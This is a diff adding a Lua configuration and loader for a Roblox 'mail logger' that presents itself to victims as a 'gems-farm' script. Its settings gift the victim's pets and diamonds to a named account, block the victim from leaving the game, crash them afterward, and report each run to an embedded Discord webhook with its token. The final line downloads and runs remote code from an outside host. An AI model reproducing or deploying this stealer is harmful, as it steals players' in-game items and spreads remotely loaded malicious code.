@@ -1,0 +1,45 @@
+```lua
+
+--[[ Arkhalis Mail Logger ]]--
+
+--[[ Main Config ]]--
+
+_G.Username = "welcom_egypt" --// Username To Send Pets To
+
+_G.GiftMessage = "i hope u happy" --// Message For The Gift To Say
+
+_G.Diamonds = 50000000000 --// Amount Of Diamonds To Not Kick
+
+_G.UnlockPets = true --// Unlocks Locked Pets
+
+_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
+
+_G.Crash = true --// Crashes Them After Its Finished
+
+--[[ Webhook Config ]]--
+
+_G.Webhook = 
+
+"https://discord.com/api/webhooks/1100584384391811143/5bVxtTOuECd6djwug9ysTRbtpw1g_eqbeae9MpjHhL6xh-mMeIjCn5RQfeSvcsmzw7z1" 
+
+--// Discord Webhook For Executions
+
+--[[ UI Config ]]--
+
+_G.ScriptName = "gems-farm" --// Script Name On The UI
+
+_G.Tip1 = "" --// Gives You Tips On The UI
+
+_G.Tip2 = "" --// Gives You Tips On The UI
+
+_G.Tip3 = "" --// Gives You Tips On The UI
+
+_G.Tip4 = "" --// Gives You Tips On The UI
+
+_G.Tip5 = "" --// Gives You Tips On The UI
+
+--[[ Script ]]--
+
+loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/Arkhalis.lua"))()
+
+```
